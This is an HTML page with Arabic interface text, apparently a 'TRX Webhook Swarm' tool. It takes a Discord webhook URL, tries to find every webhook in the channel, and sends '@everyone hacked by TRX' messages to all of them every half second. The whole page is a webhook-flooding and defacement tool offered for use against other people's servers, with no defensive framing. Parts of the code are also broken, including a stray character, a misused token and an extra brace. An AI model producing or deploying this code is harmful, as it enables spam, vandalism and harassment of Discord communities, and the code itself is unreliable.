<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRX Webhook Swarm</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        input {
            padding: 10px;
            width: 60%;
            margin-bottom: 10px;
            background: #333;
            border: 1px solid #00ff00;
            color: white;
        }

        }
    </style>
</head>
<body>

    <h1>☣️ TRX Webhook Swarm ☣️</h1>
    <input type="text" id="webhookInput" placeholder="ضع رابط الويب هوك هنا...">
    <button onclick="startAttack()">تفجير الرومات</button>
    <div id="status"></div>

    <script>
        async function startAttack() {
            const statusDiv = document.getElementById('status');
            const webhookUrl = document.getElementById('webhookInput').value.trim();
            
            if (!webhookUrl) {
                alert("الرجاء إدخال رابط الويب هوك!");
                return;
            }

            statusDiv.innerText = "جاري الاتصال بـ Discord واستخراج البيانات...";

            try {
            
                const parts = webhookUrl.split('/');
                const webhookToken = parts[parts.length - 1];
                const channelId = parts[parts.length - 2];

             
                const channelResponse = await fetch(`https://discord.com/api/v9/channels/${channelId}`, {
                    headers: {
                        'Authorization': `Bot ${webhookToken}`
                    }
                });

           .
                
                statusDiv.innerText = "جاري البحث عن الويب هوكس في السيرفر...";

           
                let allWebhooks = [];

          
                const hooksResponse = await fetch(`https://discord.com/api/v9/webhooks/channel/${channelId}`);
                const hooksData = await hooksResponse.json();
                
                if (hooksData && Array.isArray(hooksData)) {
                    allWebhooks = hooksData.map(h => h.url);
                } else {
                    
                    allWebhooks = [webhookUrl];
                }

      
                statusDiv.innerText = `تم العثور على ${allWebhooks.length} ويب هوك! جاري بدء التفجير...`;

              
                let count = 0;
                const messagePayload = {
                    content: "@everyone تم التهكير من قبل ☣️ TRX  ☣️ @everyone @here",
                    username: "TRX Hacked"
                };

                setInterval(() => {
                    
                    allWebhooks.forEach(url => {
                        fetch(url, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(messagePayload)
                        }).catch(err => console.error("Error sending to:", url));
                    });
                    
                    count++;
                    statusDiv.innerText = `🔥 تم إرسال ${count * allWebhooks.length} رسالة! 🔥`;
                }, 500); 

            } catch (error) {
                statusDiv.innerText = "حدث خطأ أثناء الاتصال: " + error.message;
            }
        }
    </script>
